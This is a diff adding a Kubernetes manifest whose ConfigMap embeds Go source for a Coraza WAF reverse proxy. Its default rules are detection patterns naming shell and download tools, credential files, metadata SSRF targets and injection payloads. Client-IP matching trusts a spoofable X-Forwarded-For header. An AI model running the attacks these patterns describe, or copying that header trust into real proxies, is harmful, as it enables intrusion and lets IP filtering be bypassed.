@@ -1,0 +1,1901 @@
+apiVersion: v1
+kind: PersistentVolumeClaim
+metadata:
+  name: coraza-waf-data-pvc
+  namespace: default
+spec:
+  accessModes:
+    - ReadWriteOnce
+  storageClassName: longhorn
+  resources:
+    requests:
+      storage: 1Gi
+---
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: coraza-waf-source
+  namespace: default
+data:
+  main.go: |
+    package main
+
+    import (
+    	"bytes"
+    	_ "embed"
+    	"encoding/json"
+    	"fmt"
+    	"io"
+    	"log"
+    	"net"
+    	"net/http"
+    	"net/http/httputil"
+    	"net/url"
+    	"os"
+    	"path/filepath"
+    	"strings"
+    	"sync"
+    	"sync/atomic"
+    	"time"
+
+    	"github.com/corazawaf/coraza-coreruleset/v4"
+    	"github.com/corazawaf/coraza/v3"
+    	"github.com/corazawaf/coraza/v3/types"
+    )
+
+    //go:embed ui.html
+    var uiHTML []byte
+
+    type RuleGroupConfig struct {
+    	ID          string `json:"id"`
+    	Name        string `json:"name"`
+    	Category    string `json:"category"`
+    	OWASPTop10  string `json:"owasp_top10"`
+    	Description string `json:"description"`
+    	Enabled     bool   `json:"enabled"`
+    	Directives  string `json:"directives"`
+    }
+
+    type BlockedIPDetail struct {
+    	IP            string   `json:"ip"`
+    	Threshold     string   `json:"threshold"`
+    	Reasoning     string   `json:"reasoning"`
+    	AttackVector  string   `json:"attack_vector"`
+    	SamplePayload string   `json:"sample_payload"`
+    	TopPaths      []string `json:"top_paths"`
+    	Country       string   `json:"country"`
+    	City          string   `json:"city"`
+    	CountryISO    string   `json:"country_iso"`
+    	IOCReputation string   `json:"ioc_reputation"`
+    	BlockedAt     string   `json:"blocked_at"`
+    }
+
+    type WAFConfig struct {
+    	EngineMode       string            `json:"engine_mode"`        // "On", "DetectionOnly", "Off"
+    	ParanoiaLevel    int               `json:"paranoia_level"`     // 1..4
+    	EnableFullCRS    bool              `json:"enable_full_crs"`    // Include full @owasp_crs/*.conf
+    	BlockedIPs       []string          `json:"blocked_ips"`        // IP/CIDR blocklist
+    	AllowedIPs       []string          `json:"allowed_ips"`        // IP/CIDR allowlist
+    	RuleGroups       []RuleGroupConfig `json:"rule_groups"`        // Toggleable OWASP Top 10 rule groups
+    	CustomSecRules   string            `json:"custom_sec_rules"`   // User-defined native SecLang rules
+    	BlockedIPDetails []BlockedIPDetail `json:"blocked_ip_details,omitempty"` // Enriched threat metadata for blocked IPs
+    	UpdatedAt        string            `json:"updated_at"`
+    }
+
+    type WAFAuditEvent struct {
+    	Timestamp     string   `json:"@timestamp"`
+    	App           string   `json:"app"`
+    	Shipper       string   `json:"shipper"`
+    	Engine        string   `json:"engine"`
+    	TransactionID string   `json:"transaction_id"`
+    	Action        string   `json:"action"` // "blocked", "detected", "allowed"
+    	Interrupted   bool     `json:"interrupted"`
+    	Status        int      `json:"status"`
+    	ClientIP      string   `json:"client_ip"`
+    	RequestMethod string   `json:"request_method"`
+    	RequestURI    string   `json:"request_uri"`
+    	Host          string   `json:"host"`
+    	UserAgent     string   `json:"user_agent"`
+    	RuleID        int      `json:"rule_id,omitempty"`
+    	RuleIDs       []int    `json:"rule_ids,omitempty"`
+    	RuleMsg       string   `json:"rule_msg,omitempty"`
+    	OWASPCategory string   `json:"owasp_category"`
+    	OWASPTop10    string   `json:"owasp_top10"`
+    	Severity      string   `json:"severity"`
+    	MatchedData   string   `json:"matched_data,omitempty"`
+    	LatencyMs     float64  `json:"latency_ms"`
+    }
+
+    type WAFStats struct {
+    	TotalRequests   uint64 `json:"total_requests"`
+    	BlockedRequests uint64 `json:"blocked_requests"`
+    	DetectedEvents  uint64 `json:"detected_events"`
+    	AllowedRequests uint64 `json:"allowed_requests"`
+    	LastReloadTime  string `json:"last_reload_time"`
+    }
+
+    var (
+    	activeWAF      atomic.Pointer[coraza.WAF]
+    	currentConfig  WAFConfig
+    	configMu       sync.RWMutex
+    	logMu          sync.Mutex
+    	recentEvents   []WAFAuditEvent
+    	recentEventsMu sync.RWMutex
+
+    	totalReqs    atomic.Uint64
+    	blockedReqs  atomic.Uint64
+    	detectedReqs atomic.Uint64
+    	allowedReqs  atomic.Uint64
+    	lastReload   string
+
+    	dataDir      = getEnv("WAF_DATA_DIR", "/data")
+    	auditLogPath = getEnv("WAF_AUDIT_LOG", "/var/log/waf/audit.log")
+    	upstreamURL  = getEnv("UPSTREAM_URL", "http://hypatian-web-service.default.svc.cluster.local:80")
+    )
+
+    func getEnv(k, fallback string) string {
+    	if v := os.Getenv(k); v != "" {
+    		return v
+    	}
+    	return fallback
+    }
+
+    func defaultRuleGroups() []RuleGroupConfig {
+    	return []RuleGroupConfig{
+    		{
+    			ID:          "RG-913",
+    			Name:        "OWASP CRS 913: Scanner & Bot Detection",
+    			Category:    "Scanner / Bot Detection",
+    			OWASPTop10:  "A05:2021-Security Misconfiguration",
+    			Description: "Blocks automated vulnerability scanners, web crawlers, and offensive recon tools (sqlmap, nikto, nuclei, nmap, masscan, dirbuster, gobuster, wfuzz, acunetix, metasploit).",
+    			Enabled:     true,
+    			Directives: `SecRule REQUEST_HEADERS:User-Agent "@rx (?i)(?:sqlmap|nikto|nmap|masscan|nessus|acunetix|nuclei|dirbuster|gobuster|wfuzz|zgrab|hydra|metasploit|burpsuite|havij|openvas|commix|wpscan)" "id:913100,phase:1,deny,status:403,log,msg:'OWASP CRS 913: Security Scanner User-Agent Detected',tag:'OWASP_CRS/SCANNER_DETECTION',tag:'A05:2021-Security_Misconfiguration',severity:'CRITICAL'"
+    SecRule &REQUEST_HEADERS:User-Agent "@eq 0" "id:913101,phase:1,pass,log,msg:'OWASP CRS 913: Missing User-Agent Header',tag:'OWASP_CRS/SCANNER_DETECTION',severity:'WARNING'"`,
+    		},
+    		{
+    			ID:          "RG-920",
+    			Name:        "OWASP CRS 920: Protocol Enforcement & Malformed HTTP",
+    			Category:    "Protocol Violation",
+    			OWASPTop10:  "A04:2021-Insecure Design",
+    			Description: "Blocks null-byte injection (%00), invalid HTTP methods (TRACE, TRACK, CONNECT), and protocol evasion anomalies.",
+    			Enabled:     true,
+    			Directives: `SecRule REQUEST_URI|ARGS|ARGS_NAMES|REQUEST_BODY "@validateByteRange 1-255" "id:920270,phase:2,deny,status:403,log,msg:'OWASP CRS 920: Null Byte (%00) Injection Detected',tag:'OWASP_CRS/PROTOCOL_VIOLATION',tag:'A04:2021-Insecure_Design',severity:'CRITICAL'"
+    SecRule REQUEST_METHOD "@rx ^(?:TRACE|TRACK|CONNECT|DEBUG)$" "id:920100,phase:1,deny,status:403,log,msg:'OWASP CRS 920: Disallowed HTTP Method',tag:'OWASP_CRS/PROTOCOL_VIOLATION',tag:'A04:2021-Insecure_Design',severity:'ERROR'"`,
+    		},
+    		{
+    			ID:          "RG-930",
+    			Name:        "OWASP CRS 930: Local File Inclusion (LFI) & Path Traversal",
+    			Category:    "Path Traversal / LFI",
+    			OWASPTop10:  "A01:2021-Broken Access Control",
+    			Description: "Blocks directory traversal (../, ..\\, %2e%2e) and sensitive OS/Kubernetes file access (/etc/passwd, /etc/shadow, /proc/self, .env, .git, kubernetes serviceaccount tokens).",
+    			Enabled:     true,
+    			Directives: `SecRule REQUEST_URI|ARGS|REQUEST_BODY "@rx (?i)(?:(?:\.\./|\.\.\\|%2e%2e%2f|%2e%2e/|\.\.%2f)|(?:/etc/passwd|/etc/shadow|/etc/hosts|/proc/self/|/var/run/secrets/kubernetes\.io|/\.(?:env|git|aws|ssh)|wp-config\.php|web\.config))" "id:930100,phase:2,deny,status:403,log,msg:'OWASP CRS 930: Path Traversal or Sensitive File Access Attempt',tag:'OWASP_CRS/LFI',tag:'A01:2021-Broken_Access_Control',severity:'CRITICAL'"`,
+    		},
+    		{
+    			ID:          "RG-931",
+    			Name:        "OWASP CRS 931: Server-Side Request Forgery (SSRF) & RFI",
+    			Category:    "SSRF / RFI",
+    			OWASPTop10:  "A10:2021-SSRF",
+    			Description: "Blocks SSRF probes targeting cloud metadata (169.254.169.254), internal Kubernetes services (.svc.cluster.local, 10.96.0.1), localhost, and dangerous URI schemes (file://, gopher://, dict://).",
+    			Enabled:     true,
+    			Directives: `SecRule ARGS|REQUEST_BODY "@rx (?i)(?:(?:file|gopher|dict|ldap|tftp)://|https?://(?:169\.254\.169\.254|127\.0\.0\.1|localhost|0\.0\.0\.0|10\.96\.0\.1|[^\s/]*\.svc\.cluster\.local|opensearch\.logging|prometheus-server))" "id:931100,phase:2,deny,status:403,log,msg:'OWASP CRS 931: SSRF or Internal Cluster Metadata Probe Detected',tag:'OWASP_CRS/SSRF',tag:'A10:2021-SSRF',severity:'CRITICAL'"`,
+    		},
+    		{
+    			ID:          "RG-932",
+    			Name:        "OWASP CRS 932: Remote Code Execution (RCE) & Command Injection",
+    			Category:    "Remote Code Execution (RCE)",
+    			OWASPTop10:  "A03:2021-Injection",
+    			Description: "Blocks OS command injection, shell pipelines, reverse shells (/bin/sh, /bin/bash, nc -e, curl/wget pipe, $(...), backticks, cmd.exe, powershell).",
+    			Enabled:     true,
+    			Directives: `SecRule ARGS|REQUEST_URI|REQUEST_BODY|REQUEST_HEADERS:User-Agent|REQUEST_HEADERS:Referer "@rx (?i)(?:(?:/bin/(?:sh|bash|zsh|dash)|/usr/bin/(?:id|whoami|uname|nc|wget|curl)|cmd\.exe|powershell(?:\.exe)?)|(?:[;&|]\s*(?:cat|ls|id|whoami|uname|pwd|wget|curl|nc|bash|sh|python|perl|ruby|php)\b)|\$\([^)]+\))" "id:932100,phase:2,deny,status:403,log,msg:'OWASP CRS 932: OS Command Injection / RCE Payload Detected',tag:'OWASP_CRS/RCE',tag:'A03:2021-Injection',severity:'CRITICAL'"`,
+    		},
+    		{
+    			ID:          "RG-941",
+    			Name:        "OWASP CRS 941: Cross-Site Scripting (XSS) & Libinjection XSS",
+    			Category:    "Cross-Site Scripting (XSS)",
+    			OWASPTop10:  "A03:2021-Injection",
+    			Description: "Uses native Coraza @detectXSS (libinjection) plus regex signatures for <script>, javascript: URIs, DOM event handlers (onerror, onload, onmouseover), and cookie theft.",
+    			Enabled:     true,
+    			Directives: `SecRule ARGS|ARGS_NAMES|REQUEST_URI|REQUEST_BODY "@detectXSS" "id:941100,phase:2,deny,status:403,log,msg:'OWASP CRS 941: XSS Attack Detected via libinjection',tag:'OWASP_CRS/XSS',tag:'A03:2021-Injection',severity:'CRITICAL'"
+    SecRule ARGS|ARGS_NAMES|REQUEST_URI|REQUEST_BODY "@rx (?i)(?:<\s*script\b|javascript\s*:|on(?:error|load|click|mouseover|focus|submit|toggle)\s*=|<\s*(?:iframe|svg|object|embed|img)\b[^>]*(?:src|onload|onerror)\s*=|document\.(?:cookie|domain|write)|alert\s*\()" "id:941110,phase:2,deny,status:403,log,msg:'OWASP CRS 941: Cross-Site Scripting (XSS) Vector Detected',tag:'OWASP_CRS/XSS',tag:'A03:2021-Injection',severity:'CRITICAL'"`,
+    		},
+    		{
+    			ID:          "RG-942",
+    			Name:        "OWASP CRS 942: SQL Injection (SQLi) & Libinjection SQLi",
+    			Category:    "SQL Injection (SQLi)",
+    			OWASPTop10:  "A03:2021-Injection",
+    			Description: "Uses native Coraza @detectSQLi (libinjection) plus signatures for UNION SELECT, boolean tautologies (OR 1=1), time-based blind SQLi (SLEEP, BENCHMARK, WAITFOR), and schema enumeration.",
+    			Enabled:     true,
+    			Directives: `SecRule ARGS|ARGS_NAMES|REQUEST_URI|REQUEST_BODY "@detectSQLi" "id:942100,phase:2,deny,status:403,log,msg:'OWASP CRS 942: SQL Injection Attack Detected via libinjection',tag:'OWASP_CRS/SQLI',tag:'A03:2021-Injection',severity:'CRITICAL'"
+    SecRule ARGS|ARGS_NAMES|REQUEST_URI|REQUEST_BODY "@rx (?i)(?:union\s+(?:all\s+)?select\b|(?:'|\"|\b)(?:or|and)\s+(?:'?\d+'?\s*=\s*'?\d+'?|true|1=1)|(?:sleep|benchmark)\s*\(\s*\d+|waitfor\s+delay\s+'|information_schema\.|xp_cmdshell|;\s*(?:drop|alter|truncate|delete\s+from)\s+table)" "id:942110,phase:2,deny,status:403,log,msg:'OWASP CRS 942: SQL Injection Payload Detected',tag:'OWASP_CRS/SQLI',tag:'A03:2021-Injection',severity:'CRITICAL'"`,
+    		},
+    		{
+    			ID:          "RG-943",
+    			Name:        "OWASP CRS 943: Session Fixation & Authentication Bypass",
+    			Category:    "Session Fixation / Auth Attack",
+    			OWASPTop10:  "A07:2021-Identification and Authentication Failures",
+    			Description: "Blocks session fixation attempts (PHPSESSID, JSESSIONID, ASPSESSIONID in query/referrers) and privilege escalation parameter tampering.",
+    			Enabled:     true,
+    			Directives: `SecRule ARGS_NAMES "@rx (?i)^(?:phpsessid|jsessionid|aspsessionid|cfid|cftoken)$" "id:943100,phase:2,deny,status:403,log,msg:'OWASP CRS 943: Session Fixation Attempt via URL Parameter',tag:'OWASP_CRS/SESSION_FIXATION',tag:'A07:2021-Auth_Failures',severity:'ERROR'"`,
+    		},
+    		{
+    			ID:          "RG-944",
+    			Name:        "OWASP CRS 944: Log4Shell, Deserialization, Prototype Pollution & SSTI",
+    			Category:    "Log4Shell / Injection / Deserialization",
+    			OWASPTop10:  "A08:2021-Software and Data Integrity Failures",
+    			Description: "Blocks Log4j JNDI lookups (${jndi:ldap:...}), Node.js Prototype Pollution (__proto__, constructor.prototype), Server-Side Template Injection ({{7*7}}), and XXE (<!ENTITY).",
+    			Enabled:     true,
+    			Directives: `SecRule ARGS|ARGS_NAMES|REQUEST_URI|REQUEST_BODY|REQUEST_HEADERS:User-Agent|REQUEST_HEADERS:Referer|REQUEST_HEADERS:X-Forwarded-For "@rx (?i)(?:\$\{\s*(?:jndi|lower|upper|env|sys|date)\s*:|__proto__|constructor\s*\.\s*prototype|<!ENTITY\s+|<!DOCTYPE\s+[^\[]+\[)" "id:944100,phase:2,deny,status:403,log,msg:'OWASP CRS 944: Log4Shell JNDI, XXE, or Prototype Pollution Attack',tag:'OWASP_CRS/INJECTION_GENERIC',tag:'A08:2021-Integrity_Failures',severity:'CRITICAL'"`,
+    		},
+    		{
+    			ID:          "RG-950",
+    			Name:        "OWASP CRS 950: Known Bad Inputs, Exploit Scanners & Webshells",
+    			Category:    "Known Bad Inputs / Exploit Probe",
+    			OWASPTop10:  "A06:2021-Vulnerable and Outdated Components",
+    			Description: "Blocks automated exploit probes against common admin paths (/phpmyadmin, /wp-admin, /wp-login.php, /vendor/phpunit, /actuator/env, /cgi-bin/, webshells c99.php/r57.php).",
+    			Enabled:     true,
+    			Directives: `SecRule REQUEST_URI "@rx (?i)(?:/phpmyadmin|/pma|/myadmin|/wp-admin|/wp-login\.php|/xmlrpc\.php|/vendor/phpunit|/actuator/(?:env|heapdump|gateway)|/cgi-bin/|/(?:c99|r57|b374k|wso|alfa)\.php|/boaform/|/GponForm/)" "id:950100,phase:1,deny,status:403,log,msg:'OWASP CRS 950: Known Exploit Path or Webshell Probe Blocked',tag:'OWASP_CRS/KNOWN_BAD_INPUTS',tag:'A06:2021-Vulnerable_Components',severity:'ERROR'"`,
+    		},
+    	}
+    }
+
+    func defaultConfig() WAFConfig {
+    	return WAFConfig{
+    		EngineMode:    "On",
+    		ParanoiaLevel: 1,
+    		EnableFullCRS: false,
+    		BlockedIPs:    []string{},
+    		AllowedIPs:    []string{},
+    		RuleGroups:    defaultRuleGroups(),
+    		CustomSecRules: `# Custom Native Coraza SecLang Rules for hypatian.io
+    # Example: Block specific custom header or path
+    SecRule REQUEST_HEADERS:X-Attack-Test "@streq blockme" "id:100001,phase:1,deny,status:403,log,msg:'Custom SecRule 100001: Blocked X-Attack-Test Header',tag:'CUSTOM_WAF_RULE',severity:'ERROR'"
+    `,
+    		UpdatedAt: time.Now().UTC().Format(time.RFC3339),
+    	}
+    }
+
+    func buildFullSecLangDirectives(cfg WAFConfig) string {
+    	var b strings.Builder
+    	b.WriteString(fmt.Sprintf("SecRuleEngine %s\n", cfg.EngineMode))
+    	b.WriteString("SecRequestBodyAccess On\n")
+    	b.WriteString("SecRequestBodyLimit 13107200\n")
+    	b.WriteString("SecRequestBodyNoFilesLimit 131072\n")
+    	b.WriteString("SecResponseBodyAccess Off\n")
+    	b.WriteString(fmt.Sprintf("SecAction \"id:900000,phase:1,nolog,pass,t:none,setvar:tx.blocking_paranoia_level=%d,setvar:tx.detection_paranoia_level=%d\"\n", cfg.ParanoiaLevel, cfg.ParanoiaLevel))
+
+    	// 1. IP Allowlist
+    	if len(cfg.AllowedIPs) > 0 {
+    		clean := []string{}
+    		for _, ip := range cfg.AllowedIPs {
+    			ip = strings.TrimSpace(ip)
+    			if ip != "" {
+    				clean = append(clean, ip)
+    			}
+    		}
+    		if len(clean) > 0 {
+    			b.WriteString(fmt.Sprintf("SecRule REMOTE_ADDR \"@ipMatch %s\" \"id:100010,phase:1,allow,nolog,msg:'IP Allowlist Match'\"\n", strings.Join(clean, ",")))
+    		}
+    	}
+
+    	// 2. IP Blocklist
+    	if len(cfg.BlockedIPs) > 0 {
+    		clean := []string{}
+    		for _, ip := range cfg.BlockedIPs {
+    			ip = strings.TrimSpace(ip)
+    			if ip != "" {
+    				clean = append(clean, ip)
+    			}
+    		}
+    		if len(clean) > 0 {
+    			b.WriteString(fmt.Sprintf("SecRule REMOTE_ADDR \"@ipMatch %s\" \"id:100020,phase:1,deny,status:403,log,msg:'Coraza IP Blocklist: Blocked Client IP',tag:'IP_BLOCKLIST',severity:'CRITICAL'\"\n", strings.Join(clean, ",")))
+    		}
+    	}
+
+    	// 3. Toggleable OWASP Top 10 Rule Groups
+    	for _, rg := range cfg.RuleGroups {
+    		if rg.Enabled && strings.TrimSpace(rg.Directives) != "" {
+    			b.WriteString(fmt.Sprintf("\n# --- %s (%s) ---\n", rg.ID, rg.Name))
+    			b.WriteString(rg.Directives + "\n")
+    		}
+    	}
+
+    	// 4. Custom SecRules from UI
+    	if strings.TrimSpace(cfg.CustomSecRules) != "" {
+    		b.WriteString("\n# --- Custom User SecRules ---\n")
+    		b.WriteString(cfg.CustomSecRules + "\n")
+    	}
+
+    	// 5. Optional Full Embedded OWASP CRS v4
+    	if cfg.EnableFullCRS {
+    		b.WriteString("\nInclude @crs-setup.conf.example\nInclude @owasp_crs/*.conf\n")
+    	}
+
+    	return b.String()
+    }
+
+    func compileWAF(cfg WAFConfig) (coraza.WAF, error) {
+    	directives := buildFullSecLangDirectives(cfg)
+    	wafCfg := coraza.NewWAFConfig().
+    		WithRootFS(coreruleset.FS).
+    		WithDirectives(directives)
+    	return coraza.NewWAF(wafCfg)
+    }
+
+    func loadOrInitConfig() error {
+    	_ = os.MkdirAll(dataDir, 0755)
+    	_ = os.MkdirAll(filepath.Dir(auditLogPath), 0755)
+    	cfgFile := filepath.Join(dataDir, "waf-config.json")
+
+    	var cfg WAFConfig
+    	if raw, err := os.ReadFile(cfgFile); err == nil {
+    		if err := json.Unmarshal(raw, &cfg); err != nil {
+    			cfg = defaultConfig()
+    		}
+    	} else {
+    		cfg = defaultConfig()
+    	}
+
+    	w, err := compileWAF(cfg)
+    	if err != nil {
+    		return err
+    	}
+    	activeWAF.Store(&w)
+    	configMu.Lock()
+    	currentConfig = cfg
+    	lastReload = time.Now().UTC().Format(time.RFC3339)
+    	configMu.Unlock()
+    	saveConfigToDisk(cfg)
+    	return nil
+    }
+
+    func saveConfigToDisk(cfg WAFConfig) {
+    	cfgFile := filepath.Join(dataDir, "waf-config.json")
+    	if b, err := json.MarshalIndent(cfg, "", "  "); err == nil {
+    		_ = os.WriteFile(cfgFile, b, 0644)
+    	}
+    	rulesFile := filepath.Join(dataDir, "active-coraza.conf")
+    	_ = os.WriteFile(rulesFile, []byte(buildFullSecLangDirectives(cfg)), 0644)
+    }
+
+    func extractClientIP(r *http.Request) string {
+    	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
+    		parts := strings.Split(xff, ",")
+    		if ip := strings.TrimSpace(parts[0]); ip != "" {
+    			return ip
+    		}
+    	}
+    	if xrip := strings.TrimSpace(r.Header.Get("X-Real-IP")); xrip != "" {
+    		return xrip
+    	}
+    	host, _, err := net.SplitHostPort(r.RemoteAddr)
+    	if err == nil && host != "" {
+    		return host
+    	}
+    	return r.RemoteAddr
+    }
+
+    func categorizeRule(ruleID int, tags []string, msg string) (string, string, string) {
+    	switch {
+    	case ruleID == 100020:
+    		return "IP Blocklist", "A01:2021-Broken Access Control", "CRITICAL"
+    	case ruleID >= 913000 && ruleID < 914000:
+    		return "Scanner / Bot Detection", "A05:2021-Security Misconfiguration", "HIGH"
+    	case ruleID >= 920000 && ruleID < 922000:
+    		return "Protocol Violation", "A04:2021-Insecure Design", "HIGH"
+    	case ruleID >= 930000 && ruleID < 931000:
+    		return "Path Traversal / LFI", "A01:2021-Broken Access Control", "CRITICAL"
+    	case ruleID >= 931000 && ruleID < 932000:
+    		return "SSRF / RFI", "A10:2021-SSRF", "CRITICAL"
+    	case ruleID >= 932000 && ruleID < 933000:
+    		return "Remote Code Execution (RCE)", "A03:2021-Injection", "CRITICAL"
+    	case ruleID >= 941000 && ruleID < 942000:
+    		return "Cross-Site Scripting (XSS)", "A03:2021-Injection", "CRITICAL"
+    	case ruleID >= 942000 && ruleID < 943000:
+    		return "SQL Injection (SQLi)", "A03:2021-Injection", "CRITICAL"
+    	case ruleID >= 943000 && ruleID < 944000:
+    		return "Session Fixation / Auth Attack", "A07:2021-Identification and Authentication Failures", "HIGH"
+    	case ruleID >= 944000 && ruleID < 945000:
+    		return "Log4Shell / Injection / Deserialization", "A08:2021-Software and Data Integrity Failures", "CRITICAL"
+    	case ruleID >= 950000 && ruleID < 960000:
+    		return "Known Bad Inputs / Exploit Probe", "A06:2021-Vulnerable and Outdated Components", "HIGH"
+    	default:
+    		return "Custom Coraza SecRule", "OWASP-WAF-Rule", "HIGH"
+    	}
+    }
+
+    func recordAuditEvent(ev WAFAuditEvent) {
+    	// Keep last 100 security events in memory for UI
+    	if ev.Action != "allowed" {
+    		recentEventsMu.Lock()
+    		recentEvents = append([]WAFAuditEvent{ev}, recentEvents...)
+    		if len(recentEvents) > 100 {
+    			recentEvents = recentEvents[:100]
+    		}
+    		recentEventsMu.Unlock()
+    	}
+
+    	line, err := json.Marshal(ev)
+    	if err != nil {
+    		return
+    	}
+    	logMu.Lock()
+    	defer logMu.Unlock()
+    	f, err := os.OpenFile(auditLogPath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
+    	if err == nil {
+    		_, _ = f.Write(append(line, '\n'))
+    		_ = f.Close()
+    	}
+    }
+
+    func evaluateRequest(waf coraza.WAF, r *http.Request, clientIP string) (types.Transaction, *types.Interruption, []byte, error) {
+    	tx := waf.NewTransaction()
+    	tx.ProcessConnection(clientIP, 0, "", 80)
+    	tx.ProcessURI(r.URL.String(), r.Method, r.Proto)
+    	for k, vals := range r.Header {
+    		for _, v := range vals {
+    			tx.AddRequestHeader(k, v)
+    		}
+    	}
+    	if r.Host != "" {
+    		tx.AddRequestHeader("Host", r.Host)
+    		tx.SetServerName(r.Host)
+    	}
+    	if it := tx.ProcessRequestHeaders(); it != nil {
+    		return tx, it, nil, nil
+    	}
+
+    	var bodyBytes []byte
+    	if r.Body != nil {
+    		bodyBytes, _ = io.ReadAll(io.LimitReader(r.Body, 2*1024*1024))
+    		r.Body = io.NopCloser(bytes.NewBuffer(bodyBytes))
+    		if len(bodyBytes) > 0 {
+    			if it, _, err := tx.WriteRequestBody(bodyBytes); err != nil || it != nil {
+    				return tx, it, bodyBytes, err
+    			}
+    		}
+    	}
+    	it, err := tx.ProcessRequestBody()
+    	return tx, it, bodyBytes, err
+    }
+
+    func extractMatchedRules(tx types.Transaction) (int, []int, string, string, string, string, string) {
+    	var primaryID int
+    	var ruleIDs []int
+    	var primaryMsg string
+    	var matchedData string
+    	cat := "Clean Traffic"
+    	top10 := "None"
+    	sev := "NONE"
+
+    	for _, mr := range tx.MatchedRules() {
+    		id := mr.Rule().ID()
+    		if id == 900000 || id == 100010 {
+    			continue
+    		}
+    		ruleIDs = append(ruleIDs, id)
+    		if primaryID == 0 {
+    			primaryID = id
+    			primaryMsg = mr.Message()
+    			matchedData = mr.Data()
+    			if matchedData == "" {
+    				for _, md := range mr.MatchedDatas() {
+    					if md.Value() != "" {
+    						matchedData = fmt.Sprintf("%s=%s", md.Key(), md.Value())
+    						break
+    					}
+    				}
+    			}
+    			cat, top10, sev = categorizeRule(id, nil, primaryMsg)
+    		}
+    	}
+    	return primaryID, ruleIDs, primaryMsg, matchedData, cat, top10, sev
+    }
+
+    func main() {
+    	if err := loadOrInitConfig(); err != nil {
+    		log.Fatalf("Failed to initialize Coraza WAF: %v", err)
+    	}
+
+    	target, err := url.Parse(upstreamURL)
+    	if err != nil {
+    		log.Fatalf("Invalid upstream URL %s: %v", upstreamURL, err)
+    	}
+    	proxy := httputil.NewSingleHostReverseProxy(target)
+
+    	// 1. Public WAF Reverse Proxy Server (:80)
+    	wafMux := http.NewServeMux()
+    	wafMux.HandleFunc("/waf-healthz", func(w http.ResponseWriter, r *http.Request) {
+    		w.Header().Set("Content-Type", "application/json")
+    		w.WriteHeader(http.StatusOK)
+    		_, _ = w.Write([]byte(`{"status":"ok","waf":"coraza-v3"}`))
+    	})
+    	wafMux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
+    		start := time.Now()
+    		totalReqs.Add(1)
+    		clientIP := extractClientIP(r)
+    		wafPtr := activeWAF.Load()
+    		if wafPtr == nil {
+    			proxy.ServeHTTP(w, r)
+    			return
+    		}
+
+    		tx, it, _, _ := evaluateRequest(*wafPtr, r, clientIP)
+    		defer func() {
+    			tx.ProcessLogging()
+    			_ = tx.Close()
+    		}()
+
+    		primaryID, ruleIDs, primaryMsg, matchedData, cat, top10, sev := extractMatchedRules(tx)
+    		interrupted := it != nil
+    		status := http.StatusOK
+    		action := "allowed"
+
+    		if interrupted {
+    			status = http.StatusForbidden
+    			action = "blocked"
+    			blockedReqs.Add(1)
+    			if primaryID == 0 {
+    				primaryID = it.RuleID
+    				primaryMsg = "Blocked by Coraza WAF SecRule"
+    				cat, top10, sev = categorizeRule(primaryID, nil, primaryMsg)
+    			}
+    		} else if len(ruleIDs) > 0 {
+    			action = "detected"
+    			detectedReqs.Add(1)
+    		} else {
+    			allowedReqs.Add(1)
+    		}
+
+    		ev := WAFAuditEvent{
+    			Timestamp:     time.Now().UTC().Format(time.RFC3339),
+    			App:           "coraza-waf",
+    			Shipper:       "sidecar",
+    			Engine:        "Coraza WAF v3 (OWASP CRS)",
+    			TransactionID: tx.ID(),
+    			Action:        action,
+    			Interrupted:   interrupted,
+    			Status:        status,
+    			ClientIP:      clientIP,
+    			RequestMethod: r.Method,
+    			RequestURI:    r.URL.RequestURI(),
+    			Host:          r.Host,
+    			UserAgent:     r.UserAgent(),
+    			RuleID:        primaryID,
+    			RuleIDs:       ruleIDs,
+    			RuleMsg:       primaryMsg,
+    			OWASPCategory: cat,
+    			OWASPTop10:    top10,
+    			Severity:      sev,
+    			MatchedData:   matchedData,
+    			LatencyMs:     float64(time.Since(start).Microseconds()) / 1000.0,
+    		}
+    		recordAuditEvent(ev)
+
+    		if interrupted {
+    			w.Header().Set("Content-Type", "application/json")
+    			w.Header().Set("X-WAF-Engine", "Coraza-v3")
+    			w.Header().Set("X-WAF-Transaction-ID", tx.ID())
+    			w.Header().Set("X-WAF-Rule-ID", fmt.Sprintf("%d", primaryID))
+    			w.WriteHeader(http.StatusForbidden)
+    			resp := map[string]interface{}{
+    				"error":          "Request Blocked by Coraza Web Application Firewall (WAF)",
+    				"status":         403,
+    				"transaction_id": tx.ID(),
+    				"rule_id":        primaryID,
+    				"rule_message":   primaryMsg,
+    				"owasp_category": cat,
+    				"owasp_top_10":   top10,
+    			}
+    			_ = json.NewEncoder(w).Encode(resp)
+    			return
+    		}
+
+    		w.Header().Set("X-WAF-Engine", "Coraza-v3")
+    		proxy.ServeHTTP(w, r)
+    	})
+
+    	// 2. Native Coraza WAF Management Console & SecLang Playground Server (:8080)
+    	adminMux := http.NewServeMux()
+    	adminMux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
+    		w.Header().Set("Content-Type", "text/html; charset=utf-8")
+    		_, _ = w.Write(uiHTML)
+    	})
+    	adminMux.HandleFunc("/api/status", func(w http.ResponseWriter, r *http.Request) {
+    		configMu.RLock()
+    		cfg := currentConfig
+    		reloadTs := lastReload
+    		configMu.RUnlock()
+
+    		recentEventsMu.RLock()
+    		evs := make([]WAFAuditEvent, len(recentEvents))
+    		copy(evs, recentEvents)
+    		recentEventsMu.RUnlock()
+
+    		w.Header().Set("Content-Type", "application/json")
+    		_ = json.NewEncoder(w).Encode(map[string]interface{}{
+    			"config":           cfg,
+    			"compiled_seclang": buildFullSecLangDirectives(cfg),
+    			"stats": WAFStats{
+    				TotalRequests:   totalReqs.Load(),
+    				BlockedRequests: blockedReqs.Load(),
+    				DetectedEvents:  detectedReqs.Load(),
+    				AllowedRequests: allowedReqs.Load(),
+    				LastReloadTime:  reloadTs,
+    			},
+    			"recent_events": evs,
+    		})
+    	})
+    	adminMux.HandleFunc("/api/config", func(w http.ResponseWriter, r *http.Request) {
+    		if r.Method != http.MethodPost {
+    			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+    			return
+    		}
+    		var newCfg WAFConfig
+    		if err := json.NewDecoder(r.Body).Decode(&newCfg); err != nil {
+    			w.Header().Set("Content-Type", "application/json")
+    			w.WriteHeader(http.StatusBadRequest)
+    			_ = json.NewEncoder(w).Encode(map[string]string{"error": "Invalid JSON: " + err.Error()})
+    			return
+    		}
+    		newCfg.UpdatedAt = time.Now().UTC().Format(time.RFC3339)
+
+    		// Validate & Compile with native Coraza v3 compiler
